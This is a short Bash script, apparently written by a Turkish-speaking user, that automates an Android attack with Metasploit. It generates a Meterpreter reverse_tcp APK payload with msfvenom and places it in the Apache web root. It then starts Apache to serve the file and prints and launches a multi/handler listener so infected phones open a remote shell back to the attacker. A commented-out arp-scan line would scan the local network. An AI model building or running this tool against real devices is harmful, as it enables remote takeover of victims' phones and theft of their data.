#!/bin/bash
#halit
#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.183 LPORT=4444 R> /root/Masaüstü/payload.apk
case $(( ( RANDOM % 10 )  + 1 )) in
1)  
toilet "/Halit" ;;
6)  
    toilet "/Halit" ;;
5)  
    toilet "/Halit" ;;
9) 
  toilet Payload  ;;
3) 
  toilet exploiting  ;;
4) toilet Meterpreter
   ;;
*) toilet "[root]//" 
toilet kali linux  ;; esac
sleep 0.5
echo Uzak sunucu IP adresi alınıyor. 
  curl ip.appspot.com 
echo //
echo Local IP adres? [0/1]
read loc
if [ $loc -eq 1 ]
then
 ifconfig
fi 
echo "IP adres: [local veya uzak sunucu adresi]" 

read ip
echo "Port numarası:"
read port

echo Ip adres: $ip  
sleep 1
echo Soket: $port
echo  '(\\?|&)(=)(.*?)(&|$|#).apk payload ? [0/1]'
read apk
if [ $apk -eq 1 ]
then
echo  Dosya adı??.
read i
  echo "Olusturulacak dizin=> Masaüstü:root/Masaüstü, Apache sunucusu kök dizini:var/www/html"
read dizin


echo  "($i) 'payload' dosyası olusturuluyor."


msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> /$dizin/$i.apk
echo DOSYA OLUŞTURULDU.
fi

sleep 0.5
echo "Apache2 sunucusu başlatılıyor."
sleep 0.5

service apache2 start
sleep 0.5
echo "SUNUCU BAŞLATILDI=>http://$ip/$i.apk"
sleep 1 

#echo Alt ağ maskesini tara? [0/1]
#read list
#if [ $list -eq 1 ]
#then
#  arp-scan --interface=wlan0 --localnet
#fi

echo "Komut=>" 
sleep 1
echo "use multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
exploit"
echo "DEVAM => [ENTER]"
read 

echo //// BAŞLATILIYOR.


msfconsole

